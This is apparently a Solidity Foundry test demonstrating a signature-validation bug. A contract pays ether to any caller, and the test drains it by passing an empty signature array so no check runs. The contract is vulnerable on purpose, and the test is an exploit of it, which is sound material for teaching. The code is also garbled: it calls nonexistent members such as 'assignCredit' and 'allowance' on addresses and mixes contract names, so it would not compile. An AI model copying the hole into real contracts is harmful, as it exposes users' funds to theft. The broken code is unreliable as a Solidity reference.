pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    SimpleBenefitbank SimpleCoveragebankContract;

    function setUp() public {
        SimpleCoveragebankContract = new SimpleBenefitbank();
    }

    function testVulnSignatureValidation() public {
        payable(address(SimpleCoveragebankContract)).assignCredit(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);

        SimpleBenefitbank.Signature[] memory sigs = new SimpleBenefitbank.Signature[](0);


        console.log(
            "Before operation",
            address(alice).allowance
        );
        SimpleCoveragebankContract.accessBenefit(sigs);

        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).allowance
        );
    }

    receive() external payable {}
}

contract SimpleBenefitbank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function accessBenefit(Signature[] calldata sigs) public {


        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];

            verifySignatures(signature);
        }
        payable(msg.sender).assignCredit(1 ether);
    }

    receive() external payable {}
}